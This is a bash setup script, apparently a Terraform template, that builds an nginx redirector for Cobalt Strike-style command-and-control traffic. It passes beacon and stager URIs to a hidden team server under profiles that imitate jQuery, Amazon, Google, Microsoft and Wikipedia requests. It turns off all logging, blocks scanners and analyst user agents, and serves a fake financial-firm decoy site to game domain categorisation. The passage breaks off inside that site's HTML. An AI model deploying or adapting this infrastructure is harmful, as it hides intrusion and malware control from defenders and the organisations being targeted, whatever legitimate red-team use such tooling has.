#!/bin/bash
# =============================================================================
# Proxy Redirector Setup Script
# =============================================================================
# Configures nginx as a reverse proxy for C2 traffic
# Handles SSL termination and domain-based routing
#
# Variables passed via Terraform templatefile():
#   - primary_domain: Primary domain (e.g., example.com)
#   - c2_subdomain: C2 subdomain (e.g., api)
#   - c2_server_ip: Internal IP of C2 team server
#   - c2_server_port: Port of C2 team server (default 443)
#   - enable_ssl: Whether to configure SSL (true/false)
#   - ssl_cert_path: Path to SSL certificate (if using custom cert)
#   - ssl_key_path: Path to SSL private key (if using custom cert)
#   - use_letsencrypt: Whether to use Let's Encrypt for SSL
#   - admin_email: Email for Let's Encrypt notifications
#   - ssl_provider: SSL provider ('letsencrypt' or 'self-signed')
#   - ssl_auto_retry: Whether to auto-retry Let's Encrypt when DNS propagates
#   - admin_email: Email for Let's Encrypt notifications
#   - malleable_profile: Name of Malleable C2 profile (for URI matching)
#   - decoy_theme: Decoy website theme ('plexura' or 'meridian-financial')
# =============================================================================

set -e

# Variables from Terraform
PRIMARY_DOMAIN="${primary_domain}"
C2_SUBDOMAIN="${c2_subdomain}"
C2_SERVER_IP="${c2_server_ip}"
C2_SERVER_PORT="${c2_server_port}"
ENABLE_SSL="${enable_ssl}"
SSL_PROVIDER="${ssl_provider}"
SSL_AUTO_RETRY="${ssl_auto_retry}"
ADMIN_EMAIL="${admin_email}"
MALLEABLE_PROFILE="${malleable_profile}"
CUSTOM_C2_URIS='${custom_c2_uris}'
DECOY_THEME="${decoy_theme}"
HOSTNAME="${hostname}"
ENABLE_FILE_PORTAL="${enable_file_portal}"
PORTAL_USERNAME="${portal_username}"
PORTAL_PASSWORD="${portal_password}"
PORTAL_SESSION_TIMEOUT="${portal_session_timeout}"

# =============================================================================
# Setup Status Tracking (for Host Setup Checker dashboard feature)
# =============================================================================
SETUP_STATUS_FILE="/opt/setup-status.json"
SETUP_ROLE="redirector"
SETUP_TOTAL=5
SETUP_STARTED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
SETUP_STEP_START=$(date +%s)
CURRENT_STEP=0
CURRENT_STEP_NAME=""

write_step_status() {
    local step_num=$1 step_name=$2 step_status=$3 message="$${4:-}"
    local now=$(date +%s)
    local duration=$((now - SETUP_STEP_START))
    SETUP_STEP_START=$now
    CURRENT_STEP=$step_num
    CURRENT_STEP_NAME=$step_name

    if [ ! -f "$SETUP_STATUS_FILE" ] || [ "$step_num" -eq 1 ]; then
        echo "{\"host\":\"$HOSTNAME\",\"role\":\"$SETUP_ROLE\",\"total_steps\":$SETUP_TOTAL,\"completed\":0,\"failed\":0,\"warnings\":0,\"status\":\"running\",\"steps\":[],\"started_at\":\"$SETUP_STARTED_AT\",\"finished_at\":null}" > "$SETUP_STATUS_FILE"
    fi

    local escaped_msg=$(echo "$message" | sed 's/"/\\"/g' | tr '\n' ' ')
    local new_step="{\"step\":$step_num,\"name\":\"$step_name\",\"status\":\"$step_status\",\"duration_s\":$duration,\"message\":\"$escaped_msg\"}"

    python3 -c "
import json, sys
with open('$SETUP_STATUS_FILE') as f:
    data = json.load(f)
step = json.loads('$new_step')
data['steps'].append(step)
data['completed'] = sum(1 for s in data['steps'] if s['status'] in ('ok','warning'))
data['failed'] = sum(1 for s in data['steps'] if s['status'] == 'failed')
data['warnings'] = sum(1 for s in data['steps'] if s['status'] == 'warning')
if data['failed'] > 0:
    data['status'] = 'partial'
elif data['completed'] == data['total_steps']:
    data['status'] = 'complete'
data['finished_at'] = '$(date -u +%Y-%m-%dT%H:%M:%SZ)'
with open('$SETUP_STATUS_FILE', 'w') as f:
    json.dump(data, f, indent=2)
" 2>/dev/null || echo "WARNING: Failed to write setup status for step $step_num"
}

trap 'write_step_status $CURRENT_STEP "$CURRENT_STEP_NAME" "failed" "Script exited unexpectedly"' ERR

# Derived values
C2_FQDN="$${C2_SUBDOMAIN}.$${PRIMARY_DOMAIN}"
LOG_FILE="/var/log/redirector-setup.log"
SSL_STATUS_FILE="/opt/ssl-status.json"

exec > >(tee -a "$LOG_FILE") 2>&1

echo "=============================================="
echo "Proxy Redirector Setup"
echo "Started: $(date)"
echo "Domain: $PRIMARY_DOMAIN"
echo "C2 FQDN: $C2_FQDN"
echo "SSL Provider: $SSL_PROVIDER"
echo "SSL Auto-Retry: $SSL_AUTO_RETRY"
echo "Decoy Theme: $DECOY_THEME"
echo "=============================================="

# Set hostname
if [ -n "$HOSTNAME" ]; then
    hostnamectl set-hostname "$HOSTNAME"
    echo "127.0.0.1 $HOSTNAME" >> /etc/hosts
    echo "Hostname set to: $HOSTNAME"
fi

# =============================================================================
# 1. System Updates and Dependencies
# =============================================================================
echo "[1/5] Installing dependencies..."

# Wait for cloud-init (timeout after 5 minutes)
CLOUD_INIT_WAIT=0
while [ ! -f /var/lib/cloud/instance/boot-finished ]; do
    sleep 5
    CLOUD_INIT_WAIT=$((CLOUD_INIT_WAIT + 5))
    if [ "$CLOUD_INIT_WAIT" -ge 300 ]; then
        echo "WARNING: cloud-init did not complete within 5 minutes, continuing anyway"
        break
    fi
done

export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get upgrade -y

# Install nginx and certbot (including DNS-01 Route53 plugin for round-robin DNS support)
apt-get install -y \
    nginx \
    nginx-extras \
    libnginx-mod-http-headers-more-filter \
    certbot \
    python3-certbot-nginx \
    python3-certbot-dns-route53 \
    curl \
    wget \
    net-tools \
    htop \
    jq \
    fail2ban

echo "Dependencies installed"
write_step_status 1 "Dependencies" "ok"

# =============================================================================
# 2. Configure Nginx Base
# =============================================================================
echo "[2/5] Configuring nginx..."

# Backup default config
mv /etc/nginx/sites-enabled/default /etc/nginx/sites-available/default.bak 2>/dev/null || true

# Create C2 redirector config
cat > /etc/nginx/sites-available/c2-redirector << 'NGINXEOF'
# C2 Redirector Configuration - OPSEC Hardened
# Generated by Terraform
# 
# OPSEC CONFIGURATION:
# - All logging disabled (access_log off, error_log /dev/null)
# - No data persistence on this server (pass-through only)
# - Ephemeral root volume (deleted on termination)
# - Scanner/bot blocking with decoy responses
# - TLS/SSL for encrypted C2 communications
#
# This redirector is designed for pass-through traffic only.
# No beacon data, logs, or metadata are stored on this system.

# Rate limiting zones
limit_req_zone $binary_remote_addr zone=c2limit:10m rate=10r/s;
limit_conn_zone $binary_remote_addr zone=connlimit:10m;

# GeoIP blocking - block common analyst countries/IPs (customize as needed)
# Uncomment and configure if geoip2 module is installed
# geo $blocked_country {
#     default 0;
#     # Add analyst/researcher IP ranges here
# }

# Upstream C2 server
upstream c2_backend {
    server $${C2_SERVER_IP}:$${C2_SERVER_PORT};
    keepalive 32;
}

# Map to validate expected User-Agents (customize to match your Malleable profile)
map $http_user_agent $valid_agent {
    default 0;
    "~*Mozilla/5.0" 1;
    "~*Chrome" 1;
    "~*Safari" 1;
    "~*Edge" 1;
    "~*Firefox" 1;
}

# Map to block known security scanners (and crawlers for technology theme)
map $http_user_agent $blocked_agent {
    default 0;
    "~*curl" 1;
    "~*wget" 1;
    "~*python" 1;
    "~*scanner" 1;
    "~*nikto" 1;
    "~*nmap" 1;
    "~*sqlmap" 1;
    "~*masscan" 1;
    "~*zgrab" 1;
    "~*censys" 1;
    "~*shodan" 1;
%{ if decoy_theme == "plexura" ~}
    # Plexura theme: block crawlers (hides from categorization)
    "~*bot" 1;
    "~*crawl" 1;
    "~*spider" 1;
%{ endif ~}
%{ if decoy_theme == "meridian-financial" ~}
    # Meridian Financial: allow Googlebot, bingbot, Bluecoat, etc. for domain categorization
    # Only block known malicious bots
    "~*HTTrack" 1;
    "~*clshttp" 1;
    "~*harvest" 1;
%{ endif ~}
}

# HTTP server (redirects to HTTPS)
server {
    listen 80;
    listen [::]:80;
    server_name $${C2_FQDN} $${PRIMARY_DOMAIN} www.$${PRIMARY_DOMAIN} cdn.$${PRIMARY_DOMAIN};

    # Hide nginx version
    server_tokens off;

    # For Let's Encrypt validation
    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }

    # Redirect all HTTP to HTTPS
    location / {
        return 301 https://$host$request_uri;
    }
}

# HTTPS server (main C2 traffic)
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name $${C2_FQDN} $${PRIMARY_DOMAIN} www.$${PRIMARY_DOMAIN} cdn.$${PRIMARY_DOMAIN};

    # Hide nginx version
    server_tokens off;

    # SSL Configuration
    ssl_certificate /etc/nginx/ssl/server.crt;
    ssl_certificate_key /etc/nginx/ssl/server.key;
    
    # Modern SSL settings (matches common browsers)
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;
    
    # OCSP Stapling (makes SSL look more legitimate)
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;

    # OPSEC: Security headers applied per-location (not server-wide)
    # Decoy site gets hardened headers; C2 locations pass upstream profile headers
    # proxy_pass_header lets the Malleable profile's Server header reach the client
    proxy_pass_header Server;

    # OPSEC: Disable all logging for C2 traffic
    # No data persistence on redirector - pass-through only
    access_log off;
    error_log /dev/null crit;

    # Rate and connection limiting
    limit_req zone=c2limit burst=20 nodelay;
    limit_conn connlimit 10;

    # Block known bad user agents - return decoy page
    if ($blocked_agent) {
        return 200 "<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>Welcome</h1><p>Site under construction.</p></body></html>";
    }

    # Default location - serve decoy website
    location / {
        root /var/www/html;
        index index.html index.htm;
        try_files $uri $uri.html $uri/ =404;

        # Security headers for decoy site (not applied to C2 proxy locations)
        add_header X-Frame-Options "SAMEORIGIN" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-XSS-Protection "1; mode=block" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        more_clear_headers Server;

        # Custom error pages
        error_page 404 /404.html;
        error_page 500 502 503 504 /50x.html;
    }

    # C2 traffic patterns — auto-configured from Malleable C2 profile
    # PLACEHOLDER_C2_LOCATIONS (replaced after heredoc by generate_nginx_c2_locations)

    # Health check (internal only - block from internet)
    location /health {
        allow 10.0.0.0/8;
        allow 172.16.0.0/12;
        allow 192.168.0.0/16;
        allow 127.0.0.1;
        deny all;
        access_log off;
        return 200 "OK";
        add_header Content-Type text/plain;
    }

    # Block common scanning paths
    location ~* ^/(admin|wp-admin|wp-login|phpmyadmin|.git|.env|.htaccess|server-status) {
        return 404;
    }
}
NGINXEOF

# Generate profile-specific nginx C2 location blocks based on Malleable profile selection
generate_nginx_c2_locations() {
    case "$MALLEABLE_PROFILE" in
        default|"")
            cat << 'LOCATIONS'
    # jQuery Malleable C2 profile (default)
    # Source: https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
    #
    # Matches ALL jQuery profile URIs with a single location block:
    #   GET:    /jquery-3.3.1.min.js       (http-get beacon check-in)
    #   POST:   /jquery-3.3.2.min.js       (http-post beacon data)
    #   Stager: /jquery-3.3.1.slim.min.js  (http-stager x86)
    #           /jquery-3.3.2.slim.min.js  (http-stager x64)

    location ~ ^/jquery-3\.[0-9]+\.[0-9]+(\.slim)?\.min\.js$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 300s;
        proxy_buffering on;
        client_max_body_size 100M;
    }
LOCATIONS
            ;;
        amazon)
            cat << 'LOCATIONS'
    # Amazon CDN Malleable C2 profile

    # GET beacon (http-get uri: /latest/meta-data/instance-id)
    location ~ ^/latest/(meta-data|api/plugins)/ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 60s;
        proxy_read_timeout 300s;
    }

    # POST beacon (http-post uri: /2/content/save)
    location ~ ^/[0-9]+/content/(save|update|sync)$ {
        if ($request_method != POST) {
            return 405;
        }
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        client_max_body_size 100M;
    }

    # Stager (http-stager uri: /latest/api/plugins/versionCheck*)
    location ~ ^/latest/api/plugins/versionCheck(64)?$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
LOCATIONS
            ;;
        google)
            cat << 'LOCATIONS'
    # Google APIs Malleable C2 profile

    # GET beacon (http-get uri: /safebrowsing/v4/threatListUpdates:fetch)
    location ~ ^/safebrowsing/v[0-9]+/(threatListUpdates|fullHashes):(fetch|find)$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 60s;
        proxy_read_timeout 300s;
    }

    # POST beacon (http-post uri: /drive/v3/files/upload)
    location ~ ^/drive/v[0-9]+/files/(upload|copy|export)$ {
        if ($request_method != POST) {
            return 405;
        }
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        client_max_body_size 100M;
    }

    # Stager (http-stager uri: /safebrowsing/v*/fullHashes:find)
    location ~ ^/safebrowsing/v[0-9]+/fullHashes:find$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
LOCATIONS
            ;;
        microsoft)
            cat << 'LOCATIONS'
    # Microsoft Azure Malleable C2 profile

    # GET beacon (http-get uri: /common/oauth2/v2.0/token)
    location ~ ^/common/oauth2/v[0-9]+\.[0-9]+/(token|authorize)$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 60s;
        proxy_read_timeout 300s;
    }

    # POST beacon (http-post uri: /v1.0/me/drive/root/children)
    location ~ ^/v[0-9]+\.[0-9]+/me/drive/ {
        if ($request_method != POST) {
            return 405;
        }
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        client_max_body_size 100M;
    }

    # Stager (http-stager uri: /connect/oauth2/authorize*)
    location ~ ^/connect/oauth2/authorize(64)?$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
LOCATIONS
            ;;
        wikipedia)
            cat << 'LOCATIONS'
    # Wikipedia Malleable C2 profile
    # Based on @bluscreenofjeff wikipedia.profile (modernized)
    #
    # GET:    /w/index.php             (beacon check-in as wiki search)
    # POST:   /wiki/<session_id>       (beacon data as article view, uri-append)
    # Stager: /w/load.php (x86)       (MediaWiki resource loader)
    #         /w/api.php (x64)        (MediaWiki API)

    # GET beacon + Stager (all /w/*.php MediaWiki endpoints)
    location ~ ^/w/(index|load|api)\.php$ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 300s;
        proxy_buffering on;
        client_max_body_size 100M;
    }

    # POST beacon (http-post: /wiki/<session_id> via uri-append)
    # Prefix match handles the session ID appended as a path component
    location ~ ^/wiki(/|$) {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Connection "";
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 300s;
        proxy_buffering on;
        client_max_body_size 100M;
    }
LOCATIONS
            ;;
        custom)
            # Custom profile — auto-generate nginx locations from parsed URIs if available
            if [ -n "$CUSTOM_C2_URIS" ] && command -v jq &>/dev/null; then
                echo "    # Custom Malleable C2 profile — auto-generated from parsed URIs"
                echo "    # URIs extracted from the custom profile pasted in the web app"
                echo ""

                # Extract URIs from JSON: {"get":["/uri"],"post":["/uri"],"stager_x86":["/uri"],"stager_x64":["/uri"]}
                GET_URIS=$(echo "$CUSTOM_C2_URIS" | jq -r '.get[]? // empty' 2>/dev/null)
                POST_URIS=$(echo "$CUSTOM_C2_URIS" | jq -r '.post[]? // empty' 2>/dev/null)
                STAGER_X86_URIS=$(echo "$CUSTOM_C2_URIS" | jq -r '.stager_x86[]? // empty' 2>/dev/null)
                STAGER_X64_URIS=$(echo "$CUSTOM_C2_URIS" | jq -r '.stager_x64[]? // empty' 2>/dev/null)

                # Combine all URIs and generate a single regex location block
                ALL_URIS=""
                for uri in $GET_URIS $POST_URIS $STAGER_X86_URIS $STAGER_X64_URIS; do
                    # Escape regex special chars in URIs for nginx location ~
                    escaped=$(echo "$uri" | sed 's/\./\\./g; s/\?/\\?/g')
                    if [ -z "$ALL_URIS" ]; then
                        ALL_URIS="$escaped"
                    else
                        ALL_URIS="$ALL_URIS|$escaped"
                    fi
                done

                if [ -n "$ALL_URIS" ]; then
                    cat << LOCATIONS
    # GET URIs: $GET_URIS
    # POST URIs: $POST_URIS
    # Stager x86: $STAGER_X86_URIS
    # Stager x64: $STAGER_X64_URIS
    # NOTE: (/|$) allows uri-append profiles (e.g., /wiki/<session_id>)
    location ~ ^($ALL_URIS)(/|$) {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_set_header Connection "";
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 300s;
        proxy_buffering on;
        client_max_body_size 100M;
    }
LOCATIONS

                    # Add stager fallback when profile doesn't define stager URIs
                    if [ -z "$STAGER_X86_URIS" ] && [ -z "$STAGER_X64_URIS" ]; then
                        cat << 'LOCATIONS'

    # Stager fallback — profile has no explicit stager URIs
    # Catches default CS stager paths (short checksum-based URIs)
    # try_files serves decoy pages first; unknown paths proxy to C2
    # For better OPSEC, add set uri_x86/uri_x64 to your Malleable profile
    location ~ ^/[a-zA-Z0-9]{4}$ {
        root /var/www/html;
        try_files $uri $uri.html @c2_stager;
    }

    location @c2_stager {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 30s;
        proxy_read_timeout 60s;
        proxy_buffering off;
    }
LOCATIONS
                    fi
                else
                    echo "    # WARNING: No URIs found in custom_c2_uris JSON"
                    echo "    # SSH to this redirector and configure manually"
                fi
            else
                # No custom URIs provided — fallback to generic catch-all
                cat << 'LOCATIONS'
    # Custom Malleable C2 profile — no auto-parsed URIs available
    # SSH to this redirector and edit this file:
    #   sudo nano /etc/nginx/sites-available/c2-redirector
    # Replace this catch-all with specific URI location blocks

    location ~ ^/(api|assets|static|content)/ {
        proxy_pass https://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 60s;
        proxy_read_timeout 300s;
        client_max_body_size 100M;
    }
LOCATIONS
            fi
            ;;
    esac
}

# Inject profile-specific C2 location blocks into nginx config
C2_LOCATIONS=$(generate_nginx_c2_locations)
sed -i "/# PLACEHOLDER_C2_LOCATIONS/r /dev/stdin" /etc/nginx/sites-available/c2-redirector <<< "$C2_LOCATIONS"
sed -i "/# PLACEHOLDER_C2_LOCATIONS/d" /etc/nginx/sites-available/c2-redirector

echo "Nginx C2 locations configured for profile: $${MALLEABLE_PROFILE:-default}"

# Replace variables in nginx config
sed -i "s/\$${C2_SERVER_IP}/$C2_SERVER_IP/g" /etc/nginx/sites-available/c2-redirector
sed -i "s/\$${C2_SERVER_PORT}/$C2_SERVER_PORT/g" /etc/nginx/sites-available/c2-redirector
sed -i "s/\$${C2_FQDN}/$C2_FQDN/g" /etc/nginx/sites-available/c2-redirector
sed -i "s/\$${PRIMARY_DOMAIN}/$PRIMARY_DOMAIN/g" /etc/nginx/sites-available/c2-redirector

# Enable the site
ln -sf /etc/nginx/sites-available/c2-redirector /etc/nginx/sites-enabled/

echo "Nginx configured"
write_step_status 2 "Nginx Config" "ok"

# =============================================================================
# 3. Create Decoy Website
# =============================================================================
echo "[3/5] Creating decoy website..."

mkdir -p /var/www/html

if [ "$DECOY_THEME" = "meridian-financial" ]; then
# =============================================================================
# MERIDIAN FINANCIAL - Meridian Financial Group
# Traditional financial advisory firm for domain categorization as "Finance"
# Allows web crawlers to index for classification purposes
# =============================================================================

cat > /var/www/html/style.css << 'CSSEOF'
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: Georgia, 'Times New Roman', Times, serif;
    line-height: 1.7;
    color: #2c2c2c;
    background: #fafaf8;
}
h1, h2, h3, h4 { font-family: Georgia, 'Times New Roman', Times, serif; font-weight: 400; }
.header {
    background: #0a1628;
    padding: 14px 0;
    border-bottom: 3px solid #8b7535;
}
.nav {
    max-width: 1000px;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.logo {
    color: #c9b06b;
    font-size: 1.35em;
    font-weight: 400;
    text-decoration: none;
    letter-spacing: 1px;
}
.nav-links a {
    color: #b0b8c4;
    text-decoration: none;
    margin-left: 28px;
    font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
    font-size: 0.85em;
    letter-spacing: 0.5px;
    text-transform: uppercase;
}
.nav-links a:hover { color: #c9b06b; }
.hero {
    background: #0a1628;
    padding: 100px 20px 80px;
    text-align: center;
    color: #e8e4d9;
    border-bottom: 3px solid #8b7535;
}
.hero h1 {
    font-size: 2.4em;
    margin-bottom: 18px;
    font-weight: 400;
    letter-spacing: 1px;
    color: #fff;
}
.hero p {
    font-size: 1.05em;
    max-width: 560px;
    margin: 0 auto 28px;
    color: #b0b8c4;
    line-height: 1.8;
}
.hero-sm { padding: 80px 20px 50px; }
.hero-sm h1 { font-size: 2em; margin-bottom: 8px; }
.btn {
    display: inline-block;
    padding: 12px 36px;
    background: #8b7535;
    color: #fff;
    text-decoration: none;
    font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
    font-size: 0.85em;
    letter-spacing: 1px;
    text-transform: uppercase;
    transition: background 0.3s;
}
.btn:hover { background: #a08940; }
.section {
    padding: 70px 20px;
    max-width: 1000px;
    margin: 0 auto;
}
.section h2 {
    text-align: center;
    margin-bottom: 16px;
    font-size: 1.8em;
    color: #0a1628;
}
.section-sub {
    text-align: center;
    color: #6b6b6b;
    margin-bottom: 50px;
    font-size: 0.95em;
}
.grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
    gap: 28px;
}
.card {
    background: #fff;
    padding: 32px 28px;
    border: 1px solid #ddd;
}
.card h3 {
    margin-bottom: 14px;
    color: #0a1628;
    font-size: 1.15em;
}
.card p { color: #555; font-size: 0.92em; }
.card ul { color: #555; margin-top: 12px; padding-left: 18px; font-size: 0.92em; }
.card ul li { margin-bottom: 6px; }
.text-center { text-align: center; }
.text-muted { color: #6b6b6b; }
.mt-20 { margin-top: 20px; }
.divider {
    width: 60px;
    height: 2px;
    background: #8b7535;
    margin: 0 auto 40px;
}
.footer {
    background: #0a1628;
    color: #7a8494;
    padding: 40px 20px 20px;
    font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
    font-size: 0.82em;
}
.footer-inner {
    max-width: 1000px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    align-items: start;
    flex-wrap: wrap;
    gap: 30px;
}
.footer-col h4 { color: #c9b06b; margin-bottom: 10px; font-size: 0.9em; letter-spacing: 1px; text-transform: uppercase; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; }
.footer-col a { color: #7a8494; text-decoration: none; display: block; margin-bottom: 5px; }
.footer-col a:hover { color: #c9b06b; }
.footer-col p { line-height: 1.8; }
.footer-bottom { margin-top: 30px; padding-top: 16px; border-top: 1px solid #1e2d44; text-align: center; }
.footer-bottom p { font-size: 0.8em; color: #5a6474; }
.disclaimer {
    max-width: 1000px;
    margin: 0 auto;
    padding: 20px 20px 0;
    font-size: 0.72em;
    color: #5a6474;
    line-height: 1.7;
    border-top: 1px solid #1e2d44;
}
/* Contact form */
.form-group { margin-bottom: 16px; }
.form-group label { display: block; margin-bottom: 4px; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; font-size: 0.82em; color: #444; letter-spacing: 0.3px; }
.form-group input, .form-group select, .form-group textarea {
    width: 100%; padding: 10px 12px; border: 1px solid #ccc; font-size: 0.92em; font-family: Georgia, 'Times New Roman', serif;
}
.form-group input:focus, .form-group select:focus, .form-group textarea:focus {
    outline: none; border-color: #8b7535;
}
CSSEOF

# Homepage
cat > /var/www/html/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Meridian Financial Group provides wealth management, investment advisory, and financial planning services for individuals and institutions.">
    <meta name="keywords" content="wealth management, financial planning, investment advisory, portfolio management, retirement planning, estate planning, fiduciary, financial advisor">
    <title>Meridian Financial Group | Wealth Management &amp; Investment Advisory</title>
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
    <link rel="stylesheet" href="/style.css">
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "FinancialService",
        "name": "Meridian Financial Group",
        "description": "Wealth management and investment advisory services.",
        "url": "https://example-financial.com",
        "serviceType": ["Wealth Management", "Investment Advisory", "Financial Planning", "Retirement Planning"]
    }
    </script>
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="/" class="logo">Meridian Financial Group</a>
            <div class="nav-links">
                <a href="/services">Services</a>
                <a href="/approach">Our Approach</a>
                <a href="/contact">Contact</a>
            </div>
        </nav>
    </header>

    <section class="hero">
        <h1>Disciplined Wealth Management</h1>
        <p>Providing independent financial counsel and investment management to individuals, families, and institutions since 2008.</p>
        <a href="/contact" class="btn">Schedule a Consultation</a>
    </section>

    <section class="section">
        <h2>Our Services</h2>
        <div class="divider"></div>
        <div class="grid">
            <div class="card">
                <h3>Wealth Management</h3>
                <p>Comprehensive wealth management built around your objectives. We work with clients to develop long-term strategies encompassing investment management, tax planning, and estate considerations.</p>
            </div>
            <div class="card">
                <h3>Investment Advisory</h3>
                <p>Objective, research-driven portfolio construction. Our investment committee employs a disciplined approach to asset allocation, diversification, and risk management across market cycles.</p>
            </div>
            <div class="card">
                <h3>Retirement Planning</h3>
                <p>Detailed retirement income analysis and distribution planning. We help clients evaluate their readiness and structure portfolios to support sustainable income through retirement.</p>
            </div>
        </div>
    </section>

    <section style="background: #fff; padding: 70px 20px; border-top: 1px solid #e8e4d9; border-bottom: 1px solid #e8e4d9;">
        <div style="max-width: 1000px; margin: 0 auto;">
            <h2 style="text-align: center; margin-bottom: 16px; font-size: 1.8em; color: #0a1628;">Why Clients Work With Us</h2>
            <div class="divider"></div>
            <div class="grid">
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 1.1em; color: #0a1628; margin-bottom: 6px; font-weight: 600;">Fiduciary Standard</div>
                    <p class="text-muted" style="font-size: 0.9em;">We act solely in our clients' interest. No commissions, no proprietary products, no conflicts of interest.</p>
                </div>
                <div style="text-align: center; padding: 20px;">
